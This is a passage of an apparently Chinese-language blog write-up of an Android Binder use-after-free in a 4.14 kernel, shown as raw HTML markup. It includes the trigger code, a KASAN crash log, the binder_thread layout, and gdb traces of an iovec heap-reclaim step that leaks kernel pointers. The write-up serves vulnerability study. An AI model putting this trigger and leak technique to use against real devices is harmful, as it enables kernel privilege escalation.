class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//iov_iter.c import_iovec</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">import_iovec</span><span class=\"params\">(<span class=\"type\">int</span> type, <span class=\"type\">const</span> <span class=\"keyword\">struct</span> iovec __user * uvector,</span></span><br><span class=\"line\"><span class=\"params\">\t\t <span class=\"type\">unsigned</span> nr_segs, <span class=\"type\">unsigned</span> fast_segs,</span></span><br><span class=\"line\"><span class=\"params\">\t\t <span class=\"keyword\">struct</span> iovec **iov, <span class=\"keyword\">struct</span> iov_iter *i)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">ssize_t</span> n;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">iovec</span> *<span class=\"title\">p</span>;</span></span><br><span class=\"line\">\tn = rw_copy_check_uvector(type, uvector, nr_segs, fast_segs,</span><br><span class=\"line\">\t\t\t\t  *iov, &amp;p);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (n &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (p != *iov)</span><br><span class=\"line\">\t\t\tkfree(p);</span><br><span class=\"line\">\t\t*iov = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> n;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tiov_iter_init(i, type, p, nr_segs, n);</span><br><span class=\"line\">\t*iov = p == *iov ? <span class=\"literal\">NULL</span> : p;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">EXPORT_SYMBOL(import_iovec);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//read_write.c</span></span><br><span class=\"line\"><span class=\"type\">ssize_t</span> <span class=\"title function_\">rw_copy_check_uvector</span><span class=\"params\">(<span class=\"type\">int</span> type, <span class=\"type\">const</span> <span class=\"keyword\">struct</span> iovec __user * uvector,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t      <span class=\"type\">unsigned</span> <span class=\"type\">long</span> nr_segs, <span class=\"type\">unsigned</span> <span class=\"type\">long</span> fast_segs,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t      <span class=\"keyword\">struct</span> iovec *fast_pointer,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t      <span class=\"keyword\">struct</span> iovec **ret_pointer)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (nr_segs &gt; fast_segs) &#123;</span><br><span class=\"line\">    iov = kmalloc(nr_segs*<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> iovec), GFP_KERNEL);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (iov == <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">        ret = -ENOMEM;</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">[#<span class=\"number\">0</span>] <span class=\"number\">0xffff000008202734</span> → rw_copy_check_uvector(type=<span class=\"number\">0x1</span>, uvector=<span class=\"number\">0xffffc2823a60</span>, nr_segs=&lt;optimized out&gt;, fast_segs=&lt;optimized out&gt;, fast_pointer=<span class=\"number\">0xffff8000f8bb6c00</span>, ret_pointer=<span class=\"number\">0xffff00000ace3d78</span>)</span><br><span class=\"line\">$<span class=\"number\">1</span> = (<span class=\"keyword\">struct</span> iovec *) <span class=\"number\">0xffff8000f8bb6c00</span></span><br></pre></td></tr></table></figure>\n<p>也就是说，它会 kmalloc(25 * sizeof(struct iovec))，大概 400 字节，这恰好落在内核的 kmalloc-512 slab 缓存中。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Starting POC</span><br><span class=\"line\">[  202.793008] ztest:binder_thread_release: thread=ffff8000f88c9600 , size is 392</span><br><span class=\"line\">[  202.793412] ztest:rw_copy_check_uvector: iov=ffff8000f88c9600, size is 16</span><br></pre></td></tr></table></figure>\n<p>而之前，PoC 刚好在 binder_thread_release() 中把那个大小也是 0x190（400）字节左右的 binder_thread 对象 free 掉，那个对象所在的 slab 正好就回到了 kmalloc-512 缓存。紧接着，rw_copy_check_uvector() 的那次 kmalloc-512 正好就分配到了这块刚释放的内存，于是：</p>\n</li>\n<li><p>偷渡内核指针</p>\n</li>\n</ol>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &amp;event);</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">ep_remove</span><span class=\"params\">(<span class=\"keyword\">struct</span> eventpoll *ep, <span class=\"keyword\">struct</span> epitem *epi)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  ep_unregister_pollwait(ep, epi);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">ep_unregister_pollwait</span><span class=\"params\">(<span class=\"keyword\">struct</span> eventpoll *ep, <span class=\"keyword\">struct</span> epitem *epi)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">list_head</span> *<span class=\"title\">lsthead</span> =</span> &amp;epi-&gt;pwqlist;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">eppoll_entry</span> *<span class=\"title\">pwq</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (!list_empty(lsthead)) &#123;</span><br><span class=\"line\">    <span class=\"comment\">//...</span></span><br><span class=\"line\">\t\tep_remove_wait_queue(pwq);</span><br><span class=\"line\">\t\tkmem_cache_free(pwq_cache, pwq);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">ep_remove_wait_queue</span><span class=\"params\">(<span class=\"keyword\">struct</span> eppoll_entry *pwq)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">wait_queue_head_t</span> *whead;</span><br><span class=\"line\"></span><br><span class=\"line\">\trcu_read_lock();</span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\t * If it is cleared by POLLFREE, it should be rcu-safe.</span></span><br><span class=\"line\"><span class=\"comment\">\t * If we read NULL we need a barrier paired with</span></span><br><span class=\"line\"><span class=\"comment\">\t * smp_store_release() in ep_poll_callback(), otherwise</span></span><br><span class=\"line\"><span class=\"comment\">\t * we rely on whead-&gt;lock.</span></span><br><span class=\"line\"><span class=\"comment\">\t */</span></span><br><span class=\"line\">\twhead = smp_load_acquire(&amp;pwq-&gt;whead);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (whead)</span><br><span class=\"line\">\t\tremove_wait_queue(whead, &amp;pwq-&gt;wait);</span><br><span class=\"line\">\trcu_read_unlock();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<ol start=\"6\">\n<li>   Child 进程读走一页，唤醒父进程继续写<br>子进程在睡眠 2 秒后，调用 read(pipefd[0],…) 取走这一页“dummy” 数据，这时管道里腾出空间，writev() 在这句就被唤醒，继续处理后续的第 11 个 iovec（也就是指向已释放内核内存的那段），完成真正的泄露。</li>\n</ol>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">break</span> ep_ptable_queue_proc</span><br><span class=\"line\">[#<span class=\"number\">0</span>] <span class=\"number\">0xffff000008249300</span> → ep_ptable_queue_proc(file=<span class=\"number\">0xffff8000fae61100</span>, whead=<span class=\"number\">0xffff8000f8bb6e98</span>, pt=&lt;optimized out&gt;)</span><br><span class=\"line\"></span><br><span class=\"line\">(remote) gef➤  x/<span class=\"number\">20</span>gx $x20</span><br><span class=\"line\"><span class=\"number\">0xffff8000f8ed71b0</span>:\t<span class=\"number\">0xffff8000f8ef2140</span>\t<span class=\"number\">0xffff8000f8ef2140</span></span><br><span class=\"line\"><span class=\"number\">0xffff8000f8ed71c0</span>:\t<span class=\"number\">0xffff8000f8ef2100</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0xffff8000f8ed71d0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0xffff000008249c38</span></span><br><span class=\"line\"><span class=\"number\">0xffff8000f8ed71e0</span>:\t<span class=\"number\">0xffff8000f8bb6ea0</span>\t<span class=\"number\">0xffff8000f8bb6ea0</span></span><br><span class=\"line\"><span class=\"number\">0xffff8000f8ed71f0</span>:\t<span class=\"number\">0xffff8000f8bb6e98</span>\t<span class=\"number\">0xffff8000f8ed7240</span></span><br><span class=\"line\"></span><br><span class=\"line\">epi = <span class=\"number\">0xffff8000f8ef2100</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">break</span> binder_thread_release</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">break</span> rw_copy_check_uvector</span><br><span class=\"line\">[#<span class=\"number\">0</span>] <span class=\"number\">0xffff0000082025c8</span> → rw_copy_check_uvector(type=<span class=\"number\">0x1</span>, uvector=<span class=\"number\">0xffffd821a1c0</span>, nr_segs=<span class=\"number\">0x18</span>, fast_segs=<span class=\"number\">0x8</span>, fast_pointer=<span class=\"number\">0xffff00000acc3de0</span>, ret_pointer=<span class=\"number\">0xffff00000acc3d78</span>)</span><br><span class=\"line\">$<span class=\"number\">1</span> = (<span class=\"keyword\">struct</span> iovec *) <span class=\"number\">0xffff8000f8bb6e00</span></span><br><span class=\"line\"><span class=\"keyword\">break</span> ep_remove_wait_queue</span><br></pre></td></tr></table></figure>","site":{"data":{}},"cover":false,"excerpt":"","more":"<h2 id=\"UAF暴露-test-c\"><a href=\"#UAF暴露-test-c\" class=\"headerlink\" title=\"UAF暴露 test.c\"></a>UAF暴露 test.c</h2><ol>\n<li>epoll 注册 Binder 的 wait queue</li>\n</ol>\n<p>测试程序中，你首先做了：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fd = open(<span class=\"string\">&quot;/dev/binder&quot;</span>, O_RDONLY);</span><br><span class=\"line\">epfd = epoll_create(<span class=\"number\">1000</span>);</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">epoll_event</span> <span class=\"title\">ev</span> =</span> &#123; .events = EPOLLIN &#125;;</span><br><span class=\"line\">epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &amp;ev);</span><br></pre></td></tr></table></figure>\n<ul>\n<li><p>   binder_poll() 会被调用</p>\n</li>\n<li><p>   在内部，它会执行类似下面的操作，把 Binder 线程的 wait_queue_head_t wait 加入到 epoll 的等待队列：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* approx. pseudo-code */</span></span><br><span class=\"line\">poll_wait(file, &amp;thread-&gt;wait, wait);</span><br></pre></td></tr></table></figure></li>\n<li><p>   这时 thread-&gt;wait 被添加到 epoll 的内部数据结构中，以便 Binder 产生事件时唤醒你的程序。</p>\n</li>\n</ul>\n<p>⸻</p>\n<ol start=\"2\">\n<li>用户态发出 BINDER_THREAD_EXIT，释放 Binder 线程对象</li>\n</ol>\n<p>紧接着，测试程序调用：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ioctl(fd, BINDER_THREAD_EXIT, <span class=\"literal\">NULL</span>);</span><br></pre></td></tr></table></figure>\n<p>在 Binder 驱动里，这会走到 <code>binder_thread_release()</code>，其核心逻辑大致是：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">binder_thread_release</span><span class=\"params\">(<span class=\"keyword\">struct</span> binder_thread *thread)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">/* …pre-cleanup… */</span></span><br><span class=\"line\">    kfree(thread);    <span class=\"comment\">// &lt;-- 这里释放了 binder_thread 对象（包括其中的 wait 字段）</span></span><br><span class=\"line\">    <span class=\"comment\">/* …post-cleanup… */</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>🚩 此时 <code>thread-&gt;wait</code>（即 epoll 队列中的 wait_queue）已经被释放。</p>\n<p>⸻</p>\n<ol start=\"3\">\n<li>进程退出，epoll 对象被关闭</li>\n</ol>\n<p>当 new.out 结束时，它的文件描述符自动被关闭，走进 __fput() 分支，针对 epoll FD 会调用：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__fput(file)  ──&gt;  ep_eventpoll_release(file-&gt;private_data)</span><br></pre></td></tr></table></figure>\n<ul>\n<li><p>   ep_eventpoll_release() 会释放 epoll 实例；</p>\n</li>\n<li><p>   它内部调用 ep_free(), 又调用 ep_unregister_pollwait()；</p>\n</li>\n<li><p>   再往里最终会执行：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">remove_wait_queue(&amp;thread-&gt;wait, &amp;poll_entry-&gt;wait);  <span class=\"comment\">// &lt;-- 这里</span></span><br></pre></td></tr></table></figure></li>\n<li><p>   但 thread 已经被 kfree 掉，&amp;thread-&gt;wait 已经是野指针，随即 remove_wait_queue() 试图给这个野指针上的 spinlock 加锁并写链表指针，触发 use-after-free。</p>\n</li>\n</ul>\n<p>⸻</p>\n<ol start=\"4\">\n<li>KASAN 报告</li>\n</ol>\n<p>日志中你看到：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[   77.771718] ==================================================================</span><br><span class=\"line\">[   77.773904] BUG: KASAN: use-after-free in remove_wait_queue+0x1d4/0x1f0</span><br><span class=\"line\">[   77.774237] Write of size 8 at addr ffff8000d3062128 by task test/1351</span><br><span class=\"line\">[   77.774506] </span><br><span class=\"line\">[   77.774991] CPU: 0 PID: 1351 Comm: test Not tainted 4.14.16-00144-g7a3cee43e935-dirty #3</span><br><span class=\"line\">[   77.775385] Hardware name: linux,dummy-virt (DT)</span><br><span class=\"line\">[   77.776218] Call trace:</span><br><span class=\"line\">[   77.776427] [&lt;ffff200008092658&gt;] dump_backtrace+0x0/0x4c0</span><br><span class=\"line\">[   77.776715] [&lt;ffff200008092b2c&gt;] show_stack+0x14/0x20</span><br><span class=\"line\">[   77.776943] [&lt;ffff200009c4b3ec&gt;] dump_stack+0x110/0x18c</span><br><span class=\"line\">[   77.777157] [&lt;ffff20000849f5dc&gt;] print_address_description+0x64/0x258</span><br><span class=\"line\">[   77.777381] [&lt;ffff20000849f048&gt;] kasan_report+0x158/0x308</span><br><span class=\"line\">[   77.777577] [&lt;ffff20000849f354&gt;] __asan_report_store8_noabort+0x1c/0x28</span><br><span class=\"line\">[   77.777790] [&lt;ffff2000081f514c&gt;] remove_wait_queue+0x1d4/0x1f0</span><br><span class=\"line\">[   77.777962] [&lt;ffff2000085cea88&gt;] ep_unregister_pollwait.isra.0+0x1b8/0x308</span><br><span class=\"line\">[   77.778153] [&lt;ffff2000085d1e40&gt;] ep_free+0xf0/0x210</span><br><span class=\"line\">[   77.778365] [&lt;ffff2000085d1f8c&gt;] ep_eventpoll_release+0x2c/0x48</span><br><span class=\"line\">[   77.778618] [&lt;ffff2000084f7734&gt;] __fput+0x22c/0x620</span><br><span class=\"line\">[   77.778800] [&lt;ffff2000084f7bac&gt;] ____fput+0xc/0x18</span><br><span class=\"line\">[   77.778978] [&lt;ffff20000818a020&gt;] task_work_run+0x150/0x1d8</span><br><span class=\"line\">[   77.779174] [&lt;ffff200008140114&gt;] do_exit+0x73c/0x1208</span><br><span class=\"line\">[   77.779360] [&lt;ffff200008140d30&gt;] do_group_exit+0x108/0x2b0</span><br><span class=\"line\">[   77.779590] [&lt;ffff200008140ef4&gt;] SyS_exit_group+0x1c/0x20</span><br><span class=\"line\">[   77.779951] Exception stack(0xffff8000d3b1fec0 to 0xffff8000d3b20000)</span><br></pre></td></tr></table></figure>\n<p>这正是上面第 3 步中，remove_wait_queue() 在一个已经被 kfree 的 wait_queue_head_t 上操作导致的野指针写，KASAN 立刻捕捉到，并在尝试解除锁链时崩溃。</p>\n<p>⸻</p>\n<p>漏洞触发总结</p>\n<ol>\n<li>   epoll_ctl(ADD) 调用 binder_poll，将 thread-&gt;wait 加入 epoll 等待列表。</li>\n<li>   ioctl(BINDER_THREAD_EXIT) 释放 binder_thread 结构（包含 wait 字段）。</li>\n<li>   进程退出 / epoll FD 关闭 时，ep_eventpoll_release 调用 remove_wait_queue(&amp;thread-&gt;wait, …)。</li>\n<li>   thread-&gt;wait 已被释放，remove_wait_queue 执行 UAF 写操作，KASAN 捕获并报错。</li>\n</ol>\n<p>⸻</p>\n<p>代码位置参考<br>•    注册 wait queue：drivers/android/binder.c 中的 binder_poll() → poll_wait(…, &amp;thread-&gt;wait, …)<br>•    释放线程：drivers/android/binder.c 中的 binder_thread_release() → kfree(thread)<br>•    清理 epoll：fs/eventpoll.c 中的 ep_eventpoll_release() → ep_free() → ep_unregister_pollwait() → remove_wait_queue()</p>\n<h2 id=\"UAF利用-poc-c\"><a href=\"#UAF利用-poc-c\" class=\"headerlink\" title=\"UAF利用 poc.c\"></a>UAF利用 poc.c</h2><p>binder_thread</p>\n<p>结构体</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">binder_thread</span> &#123;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">binder_proc</span> *<span class=\"title\">proc</span>;</span> <span class=\"comment\">//0x8</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">rb_node</span> <span class=\"title\">rb_node</span>;</span> <span class=\"comment\">//0x18</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">list_head</span> <span class=\"title\">waiting_thread_node</span>;</span> <span class=\"comment\">//0x10</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> pid;<span class=\"comment\">//0x4</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> looper; <span class=\"comment\">//0x4             /* only modified by this thread */</span></span><br><span class=\"line\">\t<span class=\"type\">bool</span> looper_need_return; <span class=\"comment\">/* can be written by other thread */</span> <span class=\"comment\">//0x1 实际 0x8</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">binder_transaction</span> *<span class=\"title\">transaction_stack</span>;</span> <span class=\"comment\">//0x8</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">list_head</span> <span class=\"title\">todo</span>;</span> <span class=\"comment\">//0x10</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">binder_error</span> <span class=\"title\">return_error</span>;</span><span class=\"comment\">//0x20</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">binder_error</span> <span class=\"title\">reply_error</span>;</span><span class=\"comment\">//0x20</span></span><br><span class=\"line\">\t<span class=\"type\">wait_queue_head_t</span> wait;<span class=\"comment\">//0x18</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">binder_stats</span> <span class=\"title\">stats</span>;</span><span class=\"comment\">//0xcc</span></span><br><span class=\"line\">\t<span class=\"type\">atomic_t</span> tmp_ref;<span class=\"comment\">//0x4</span></span><br><span class=\"line\">\t<span class=\"type\">bool</span> is_dead;<span class=\"comment\">//0x1</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>调试显示</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(remote) gef➤  print *thread</span><br><span class=\"line\">$3 = &#123;</span><br><span class=\"line\">  proc = 0xffff8000d63c3c80,</span><br><span class=\"line\">  rb_node = &#123;</span><br><span class=\"line\">    __rb_parent_color = 0x1,</span><br><span class=\"line\">    rb_right = 0x0,</span><br><span class=\"line\">    rb_left = 0x0</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  waiting_thread_node = &#123;</span><br><span class=\"line\">    next = 0xffff8000d30c58a0,</span><br><span class=\"line\">    prev = 0xffff8000d30c58a0</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  pid = 0x545,</span><br><span class=\"line\">  looper = 0x20,</span><br><span class=\"line\">  looper_need_return = 0x1,</span><br><span class=\"line\">  transaction_stack = 0x0,</span><br><span class=\"line\">  todo = &#123;</span><br><span class=\"line\">    next = 0xffff8000d30c58c8,</span><br><span class=\"line\">    prev = 0xffff8000d30c58c8</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  return_error = &#123;</span><br><span class=\"line\">    work = &#123;</span><br><span class=\"line\">      entry = &#123;</span><br><span class=\"line\">        next = 0x0,</span><br><span class=\"line\">        prev = 0x0</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      type = BINDER_WORK_RETURN_ERROR</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    cmd = 0x7201</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  reply_error = &#123;</span><br><span class=\"line\">    work = &#123;</span><br><span class=\"line\">      entry = &#123;</span><br><span class=\"line\">        next = 